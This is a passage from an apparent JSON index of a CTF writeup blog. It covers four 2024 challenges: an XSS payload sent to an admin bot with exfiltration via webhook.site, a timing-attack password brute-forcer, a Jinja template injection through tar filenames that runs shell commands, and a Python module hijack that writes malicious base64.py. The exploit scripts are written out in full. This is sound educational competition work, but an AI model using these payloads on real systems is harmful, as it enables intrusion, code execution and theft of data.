payload = \u0026quot;\u0026quot;\u0026quot;\u0026lt;img%0Csrc=\u0026quot;invalid.jpg\u0026quot;onerror=\u0026quot;eval(atob('\u0026quot;\u0026quot;\u0026quot; + main_payload + \u0026quot;\u0026quot;\u0026quot;'));\u0026quot;\u0026gt;\u0026quot;\u0026quot;\u0026quot; # Bypassed with %0C final_url_whith_exploit = f\u0026quot;{url}?name={payload}\u0026quot; print(f\u0026quot;Final url: {final_url_whith_exploit}\u0026quot;) # Send the url on the admin bot and download the file on webhook.site print(f\u0026quot;Now copy and paste the url on the admin bot: {url_admin} and send the requeste to the admin bot, after this go to the webhook.site and download the file and search the flag in the file\u0026quot;) if __name__ == '__main__': main() $ flag: idek{Ghazy_N3gm_Elbalad} Author: akiidjk ","permalink":"http://localhost:1313/writeups/idekctf2024/hello/","title":"Hello"},{"content":" IdekCTF 2024 Description idekCTF is an information security CTF competition organized by the idek team and is aimed at the entire spectrum from high school and university students to experienced players. idekCTF will cover the standard Jeopardy-style CTF topics (binary exploitation, reverse engineering, cryptography, web exploitation, and forensics) as well as other, less standard categories.\nUrl Discord Performance Summary CTFs: 6/35 Total points: 732 Position: 101/1070 Rating points: 5.405 Writeups Web Hello ","permalink":"http://localhost:1313/writeups/idekctf2024/","title":"IdekCTF 2024"},{"content":"Kirbytime Description: Welcome to Kirby\u0026rsquo;s Website.\nIntroduction We find ourselves in front of a very pink Kirby-themed page, where we are asked to enter a password of 7 characters.\nSource # filename: main.py import sqlite3 from flask import Flask, request, redirect, render_template import time app = Flask(__name__) @app.route('/', methods=['GET', 'POST']) def login(): message = None if request.method == 'POST': password = request.form['password'] real = 'REDACTED' if len(password) != 7: return render_template('login.html', message=\u0026quot;you need 7 chars\u0026quot;) for i in range(len(password)): if password[i] != real[i]: message = \u0026quot;incorrect\u0026quot; return render_template('login.html', message=message) else: time.sleep(1) if password == real: message = \u0026quot;yayy! hi kirby\u0026quot; return render_template('login.html', message=message) if __name__ == '__main__': app.run(host='0.0.0.0') As we can see in the code at the \u0026lsquo;/\u0026rsquo; endpoint, when the method and post, it takes the password value from the form, checks the length to be 7 and starts iterating over each character to check if it is correct, it triggers a time.sleep(1) otherwise it returns an error.\nSolution The solution is very simple, in fact we can compare it to a kind of time based, when the character is correct we know that the request will take n seconds to return depending on the number of correct characters. With this script we can easily find the flag, but only with a little patience (I recommend a cup of coffee in between).\n# filename: exploit.py import string import requests url = 'redacted' alphabet = string.printable length = 7 correct_flag = 'a' * length correct_letter = 0 flag_list = list(correct_flag) number_of_second_to_wait = 7 while (correct_letter != length): for letter in alphabet: flag_list[correct_letter] = letter flag = \u0026quot;\u0026quot;.join(flag_list) print(flag) payload = {\u0026quot;password\u0026quot;: flag} r = requests.post(url=url, data=payload) assert r.status_code == 200 print(\u0026quot;Time: \u0026quot;, r.elapsed.total_seconds()) if r.elapsed.total_seconds() \u0026gt;= number_of_second_to_wait: correct_letter = correct_letter + 1 number_of_second_to_wait += 1 print(flag) break print(\u0026quot;Flag found: \u0026quot;, \u0026quot;LITCTF{\u0026quot; + flag + \u0026quot;}\u0026quot;) $ flag: LITCTF{kBySlaY} Author: akiidjk ","permalink":"http://localhost:1313/writeups/litctf2024/kirbytime/","title":"Kirbytime"},{"content":" Lexington Informatics Tournament CTF Description Lexington Informatics Tournament CTF 2024 is a Jeopardy-style, beginner-friendly online CTF that\u0026rsquo;s open to everyone.\nUrl Discord Performance Summary CTFs: 18/32 Total points: 2068 Position: 95/830 Rating points: 19.095 Writeups Web Kirbytime ","permalink":"http://localhost:1313/writeups/litctf2024/","title":"Lexington Informatics Tournament CTF 2024"},{"content":"File Sharing Portal Description: Welcome to the file sharing portal! We only support tar files!\nIntroduction The ctf has a very simple structure: we have a form in which we are asked to insert a tar file; once the tar file has been inserted, it is unzipped and we are shown the name of files it contains; by clicking on the different files, we can read their contents.\nSource The source has comments added later to allow a better understanding of the code in the writeups\n# filename: server.py #!/usr/bin/env python3 from flask import Flask, request, redirect, render_template, render_template_string import tarfile from hashlib import sha256 import os app = Flask(__name__) @app.route('/',methods=['GET','POST']) def main(): # This function mainly deals with loading the tar file into the server's file system. global username if request.method == 'GET': return render_template('index.html') elif request.method == 'POST': file = request.files['file'] if file.filename[-4:] != '.tar': # Check that the file passed is actually a tar file return render_template_string(\u0026quot;\u0026lt;p\u0026gt; We only support tar files as of right now!\u0026lt;/p\u0026gt;\u0026quot;) # Otherwise, it renders an error message name = sha256(os.urandom(16)).digest().hex() # Creates a random name that it will use to name our tar and the folder in the server's file system os.makedirs(f\u0026quot;./uploads/{name}\u0026quot;, exist_ok=True) # Create the directory file.save(f\u0026quot;./uploads/{name}/{name}.tar\u0026quot;) # Save the tar file try: # Extract the tar file tar_file = tarfile.TarFile(f'./uploads/{name}/{name}.tar') tar_file.extractall(path=f'./uploads/{name}/') return render_template_string(f\u0026quot;\u0026lt;p\u0026gt;Tar file extracted! View \u0026lt;a href='/view/{name}'\u0026gt;here\u0026lt;/a\u0026gt;\u0026quot;) except: return render_template_string(\u0026quot;\u0026lt;p\u0026gt;Failed to extract file!\u0026lt;/p\u0026gt;\u0026quot;) @app.route('/view/\u0026lt;name\u0026gt;') def view(name): # This function displays the files contained in the .tar file if not all([i in \u0026quot;abcdef1234567890\u0026quot; for i in name]): # Check that the file name is in hexadecimal, to avoid any kind of malicious input return render_template_string(\u0026quot;\u0026lt;p\u0026gt;Error!\u0026lt;/p\u0026gt;\u0026quot;) #print(os.popen(f'ls ./uploads/{name}').read()) #print(name) files = os.listdir(f\u0026quot;./uploads/{name}\u0026quot;) # List all files in the previously created folder out = '\u0026lt;h1\u0026gt;Files\u0026lt;/h1\u0026gt;\u0026lt;br\u0026gt;' files.remove(f'{name}.tar') # Remove the tar file from the list for i in files: out += f'\u0026lt;a href=\u0026quot;/read/{name}/{i}\u0026quot;\u0026gt;{i}\u0026lt;/a\u0026gt;' # Show via templates all file names # except: return render_template_string(out) # Render the template with the render_template_string function @app.route('/read/\u0026lt;name\u0026gt;/\u0026lt;file\u0026gt;') def read(name,file): # The function shows the contents of the single file if (not all([i in \u0026quot;abcdef1234567890\u0026quot; for i in name])): # Check that the file name is in hexadecimal, to avoid any kind of malicious input return render_template_string(\u0026quot;\u0026lt;p\u0026gt;Error!\u0026lt;/p\u0026gt;\u0026quot;) if ((\u0026quot;..\u0026quot; in name) or (\u0026quot;..\u0026quot; in file)) or ((\u0026quot;/\u0026quot; in file) or \u0026quot;/\u0026quot; in name): # Other controls to avoid path er return render_template_string(\u0026quot;\u0026lt;p\u0026gt;Error!\u0026lt;/p\u0026gt;\u0026quot;) f = open(f'./uploads/{name}/{file}') # Open the file data = f.read() f.close() return data # Return the content of file if __name__ == '__main__': app.run(host='0.0.0.0', port=1337) We can therefore see that there are several parameter checks, and at first one might think that the code is 100% safe.\nSolution The first thing that came to mind was to create a symbolic link to access the flag, and indeed this works (try with server.py), the problem is that the filename of the flag is unknown and this does not allow us to create a valid symbolic link.\nOnce we realised this, we did a thorough analysis of the code and came to the conclusion that the only thing that was not being checked was the name of the unpacked tar file allowing us to insert anything. By combining this with the \u0026lsquo;render_template_string\u0026rsquo; function (a vulnerable function of flask), it is possible to perform a template injection.\n# filename: exploit.py import requests import os import tarfile from bs4 import BeautifulSoup url = 'http://redacted.challs.n00bzunit3d.xyz:8080/' def create_tar(tar_name, file): with tarfile.open(tar_name, 'w') as tar: tar.add(file, arcname=os.path.basename(file)) print(f'Tar file created: {tar_name}') def create_payload(payload): with open(payload, 'w') as f: f.write('Remember to byte the cookies') create_tar('exploit.tar', payload) print(f'Payload created: {payload}') def get_url_view(text): soup = BeautifulSoup(text, 'html5lib') return [a['href'] for a in soup.find_all('a', href=True)][0] def leak_subprocess_index(): payload = \u0026quot;{{int.__class__.__base__.__subclasses__()}}\u0026quot; create_payload(payload) r = requests.post(url, files={'file': open('exploit.tar', 'rb')}) url_file = get_url_view(r.text) r = requests.get(url + url_file) text = r.text[r.text.index('[')+1:] list_classes = text.split(',') for i, c in enumerate(list_classes): if 'subprocess.Popen' in c: print(f'Index subprocess.Popen: {i}') return str(i) def get_flag(index): payload = \u0026quot;{{int.__class__.__base__.__subclasses__()[\u0026quot; + \\ index + \u0026quot;]('cat *', shell=True, stdout=-1).communicate()}}\u0026quot; create_payload(payload) r = requests.post(url, files={'file': open('exploit.tar', 'rb')}) url_file = get_url_view(r.text) r = requests.get(url + url_file) flag = r.text[r.text.index('n00bz{'):r.text.index('}')+1] print(f'Flag: {flag}') def main(): subprocess_index = leak_subprocess_index() get_flag(subprocess_index) if __name__ == '__main__': main() $ flag: n00bz{n3v3r_7rus71ng_t4r_4g41n!_b3506983087e} Author: akiidjk ","permalink":"http://localhost:1313/writeups/noobzctf2024/filesharingportal/","title":"File Sharing Portal"},{"content":"Waas Description: Writing as a Service!\nIntroduction WaaS (Writing as a Service) allows us to overwrite a file on the system (after some input validation) and insert anything (until a newline is met) we want in it.\nimport subprocess from base64 import b64decode as d while True: print(\u0026quot;[1] Write to a file\\n[2] Get the flag\\n[3] Exit\u0026quot;) try: inp = int(input(\u0026quot;Choice: \u0026quot;).strip()) except: print(\u0026quot;Invalid input!\u0026quot;) exit(0) if inp == 1: file = input(\u0026quot;Enter file name: \u0026quot;).strip() assert file.count('.') \u0026lt;= 2 # Why do you need more? assert \u0026quot;/proc\u0026quot; not in file # Why do you need to write there? assert \u0026quot;/bin\u0026quot; not in file # Why do you need to write there? assert \u0026quot;\\n\u0026quot; not in file # Why do you need these? assert \u0026quot;chall\u0026quot; not in file # Don't be overwriting my files! try: f = open(file,'w') except: print(\u0026quot;Error! Maybe the file does not exist?\u0026quot;) f.write(input(\u0026quot;Data: \u0026quot;).strip()) f.close() print(\u0026quot;Data written sucessfully!\u0026quot;) if inp == 2: flag = subprocess.run([\u0026quot;cat\u0026quot;,\u0026quot;fake_flag.txt\u0026quot;],capture_output=True) # You actually thought I would give the flag? print(flag.stdout.strip()) Solution At first one may think of trying to bypass the input validation to perhaps rewrite the workings of the cat command or the challenge file itself, but this isn\u0026rsquo;t possible. Something very bizarre is the imported but unused b64decode from the base64 module, which is what allows us to solve the challenge. When python imports modules it looks in sys.path, which has a list of valid directories to import modules from. After a quick scan through the python3 docs we find out that the first directory it looks through is the same directory the file is in, this means that if we have a base64.py file in the directory then python will try to import a b64decode symbol from that file instead of the common known module. One more feature of python\u0026rsquo;s import behavior we can use is the that all the code in an imported module will be executed. For example if a file test.py has print('Hello, World!') and it can be executed (for example if it\u0026rsquo;s at the lowest indentation level) then a file with import test will indeed see Hello, World! printed to stdout. Therefore, since the open function with a 'w' flag will create a file if it does not exist, we can simply create a file named base64.py and write our malicious code in it. Something like this will do the trick:\nimport os; b64decode = 0; os.system(\u0026quot;cat flag.txt\u0026quot;) But the flag isn\u0026rsquo;t our yet; we need to use the fact that the instance does not reset its files every time we connect to it, which means that our base64.py will remain in the directory for the lifetime of the instance. This means we simply need to reconnect to it and get our flag.\nsolve.py\nfrom pwn import * def solve(): r = remote('challs.n00bzunit3d.xyz', 10478) # PORT depends on the instance r.sendlineafter(b'Choice: ', b'1') # 1 to write a file r.sendlineafter(b'Enter file name: ', b'base64.py') r.sendlineafter(b'Data: ', b'import os; b64decode = 0; os.system(\u0026quot;cat flag.txt\u0026quot;)') r.close() r = remote('challs.n00bzunit3d.xyz', 10478) # PORT depends on the instance flag = r.recvline().decode() print(f'flag: {flag}') r.close() if __name__ == '__main__': solve() $ flag: n00bz{0v3rwr1t1ng_py7h0n3_m0dul3s?!!!_f5c63f47af0e} Author: vympel\n","permalink":"http://localhost:1313/writeups/noobzctf2024/waas/","title":"WaaS"},{"content":" N00bz CTF 2024 Description A 48 hours CTF hosted by n00bz for n00bz. Organized with beginner friendly challenges (and some hard ones), n00bzCTF is dedicated to make cyber security more friendly and approachable for complete n00bz.\nUrl Discord Performance Summary CTFs: 31/32 Total points: 9794.000 Position: 24/967 Rating points: 24.067 Writeups Web File Sharing Portal Misc Waas ","permalink":"http://localhost:1313/writeups/n00bzctf2024/","title":"N00bzCTF 2024"}]